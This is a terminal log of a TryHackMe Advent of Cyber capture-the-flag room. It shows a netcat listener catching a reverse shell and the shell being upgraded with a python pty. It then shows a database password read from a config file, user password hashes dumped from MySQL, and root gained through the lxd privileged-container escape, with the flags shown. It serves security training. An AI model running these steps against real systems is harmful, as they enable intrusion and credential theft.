┌──(kali㉿kali)-[~/GitHub/TryHackMe/AdventOfCyber2]            
└─$ sudo nc -lvnp 443                                                                                                         
[sudo] password for kali:                                      
listening on [any] 443 ...                                     
connect to [10.6.85.73] from (UNKNOWN) [10.10.221.146] 56354   
Linux light-cycle 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux               
 21:06:00 up 48 min,  0 users,  load average: 0.00, 0.00, 0.03 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)          
/bin/sh: 0: can't access tty; job control turned off           
$ cd /var/www                                                  
$ ls                                                           
ENCOM                                                          
TheGrid                                                        
web.txt                                                        
$ cat web.txt                                                  
THM{ENTER_THE_GRID}                                            
$ cd TheGrid                                                   
$ ls                                                           
includes                                                       
public_html                                                    
rickroll.mp4                                                   
$ cd includes                                                  
$ ls                                                           
apiIncludes.php                                                
dbauth.php                                                     
login.php                                                      
register.php                                                   
upload.php                                                     
$ cat dbauth.php                                               
<?php                                                          
        $dbaddr = "localhost";                                 
        $dbuser = "tron";                                      
        $dbpass = "IFightForTheUsers";                         
        $database = "tron";                                    

        $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);                                                              
        if($dbh->connect_error){                               
                die($dbh->connect_error);                      
        }                                                      
?>                                                             
$ mysql -utron -p                                              
Enter password: IFightForTheUsers                              
IFightForTheUsers                                              


^C                                                             

┌──(kali㉿kali)-[~/GitHub/TryHackMe/AdventOfCyber2]            
└─$ sudo nc -lvnp 443                                          
listening on [any] 443 ...                                     
connect to [10.6.85.73] from (UNKNOWN) [10.10.221.146] 56356   
Linux light-cycle 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux               
 21:07:02 up 49 min,  0 users,  load average: 0.00, 0.00, 0.02 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)          
/bin/sh: 0: can't access tty; job control turned off           
$ python3 -c 'import pty;pty.spawn("/bin/bash")'               
www-data@light-cycle:/$ export TERM=xterm                      
export TERM=xterm                                              
www-data@light-cycle:/$ ^Z                                     
[1]+  Stopped                 sudo nc -lvnp 443                

┌──(kali㉿kali)-[~/GitHub/TryHackMe/AdventOfCyber2]            
└─$ stty raw -echo; fg                                         
sudo nc -lvnp 443                                              

www-data@light-cycle:/$ cd /var/www/                           
www-data@light-cycle:/var/www$ cat web.txt                     
THM{ENTER_THE_GRID}                                            
www-data@light-cycle:/var/www$ ls                              
ENCOM  TheGrid  web.txt                                        
www-data@light-cycle:/var/www$ cd TheGrid/includes/            
www-data@light-cycle:/var/www/TheGrid/includes$ ls             
apiIncludes.php  dbauth.php  login.php  register.php  upload.php                                                              
www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php 
<?php                                                          
        $dbaddr = "localhost";                                 
        $dbuser = "tron";                                      
        $dbpass = "IFightForTheUsers";                         
        $database = "tron";                                    

        $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);                                                              
        if($dbh->connect_error){                               
                die($dbh->connect_error);                      
        }                                                      
?>                                                             
www-data@light-cycle:/var/www/TheGrid/includes$ mysql -utron -p
Enter password:                                                
Welcome to the MySQL monitor.  Commands end with ; or \g.      
Your MySQL connection id is 359                                
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)               

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.                                                  

Oracle is a registered trademark of Oracle Corporation and/or its                                                             
affiliates. Other names may be trademarks of their respective  
owners.                                                        

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                

mysql> show databases;                                         
+--------------------+                                         
| Database           |                                         
+--------------------+                                         
| information_schema |                                         
| tron               |                                         
+--------------------+                                         
2 rows in set (0.00 sec)                                       

mysql> use tron                                                
Reading table information for completion of table and column names                                                            
You can turn off this feature to get a quicker startup with -A 

Database changed                                               
mysql> show tables;                                            
+----------------+                                             
| Tables_in_tron |                                             
+----------------+                                             
| users          |                                             
+----------------+                                             
1 row in set (0.00 sec)                                        

mysql> SELECT * FROM users                                     
    -> ;                                                       
+----+----------+----------------------------------+           
| id | username | password                         |           
+----+----------+----------------------------------+           
|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |           
|  2 | asdf     | 912ec803b2ce49e4a541068d495ab570 |           
+----+----------+----------------------------------+           
2 rows in set (0.00 sec)                                       

mysql> exit                                                    
Bye                                                            
www-data@light-cycle:/var/www/TheGrid/includes$ su flynn       
Password:                                                      
flynn@light-cycle:/var/www/TheGrid/includes$ cd ~              
flynn@light-cycle:~$ ls                                        
user.txt                                                       
flynn@light-cycle:~$ cat user.txt                              
THM{IDENTITY_DISC_RECOGNISED}                                  
flynn@light-cycle:~$ groups                                    
flynn lxd                                                      
flynn@light-cycle:~$ lxc image list                            
To start your first container, try: lxc launch ubuntu:18.04    

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+           
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |           
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+           
| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |           
+--------+-----------                                                                                                         
flynn@light-cycle:~$                                           
flynn@light-cycle:~$ lxc init Alpine alp -c security.privileged=true                                                          
Creating alp                                                   
recursive=truecle:~$ lxc config device add alp dsk disk source=/ path=/mnt/root                                               
Device dsk added to alp                                        
flynn@light-cycle:~$ lxc start alp                             
flynn@light-cycle:~$ lxc exec alp /bin/sh                      
~ # id                                                         
uid=0(root) gid=0(root)                                        
~ # cd /mnt/root/root/                                         
/mnt/root/root # ls                                            
root.txt                                                       
/mnt/root/root # cat root.txt                                  
THM{FLYNN_LIVES}                                               



"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!"                                                     
/mnt/root/root #                                               
